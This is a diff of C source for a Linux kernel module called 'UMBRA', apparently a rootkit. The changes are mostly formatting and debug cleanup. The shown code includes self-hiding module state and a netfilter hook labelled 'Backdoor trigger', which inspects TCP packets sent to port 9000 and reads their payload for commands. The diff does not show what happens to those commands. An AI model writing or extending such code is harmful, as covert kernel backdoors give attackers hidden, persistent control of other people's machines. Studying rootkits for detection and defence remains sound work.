@@ -2,9 +2,11 @@
 
 static struct list_head *prev_module;
 static short hidden = 0;
+
 ////////////////////////////////
 //TODO FIX ALL {} formatting
 ////////////////////////////////
+
 static unsigned int my_nf_hookfn(void *priv,
               struct sk_buff *skb,
               const struct nf_hook_state *state)
@@ -33,7 +35,8 @@ static unsigned int my_nf_hookfn(void *priv,
     }
 
     //Backdoor trigger: TCP
-    if(ip_header->protocol==IPPROTO_TCP){ 
+    if(ip_header->protocol==IPPROTO_TCP)
+    { 
         unsigned int dport;
         unsigned int sport;
 
@@ -43,12 +46,9 @@ static unsigned int my_nf_hookfn(void *priv,
         sport = htons((unsigned short int) tcp_header->source);
         dport = htons((unsigned short int) tcp_header->dest);
         //printk(KERN_INFO "UMBRA:: Received packet on port %u\n", dport);
-        if(dport != 9000){
-            return NF_ACCEPT; //We ignore those not for port 9000
-        }
-        else if (dport == 22)
+        if(dport != 9000)
         {
-
+            return NF_ACCEPT; //We ignore those not for port 9000
         }
         printk(KERN_INFO "UMBRA:: Received packet on port 9000\n");
              
@@ -66,13 +66,6 @@ static unsigned int my_nf_hookfn(void *priv,
             kfree(_data);
             return NF_ACCEPT;
         }
-        
-        /*printk(KERN_INFO "IP offest %i\n", ip_header->ihl*4);
-        printk(KERN_INFO "tcp offest %i\n", tcp_header->doff*4);
-       
-        printk(KERN_INFO "Total length %i\n", htons(ip_header->tot_len));
-        printk(KERN_INFO "Size of payload %i\n", size);
-        */
 
         printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
         printk(KERN_DEBUG "%s\n", user_data);
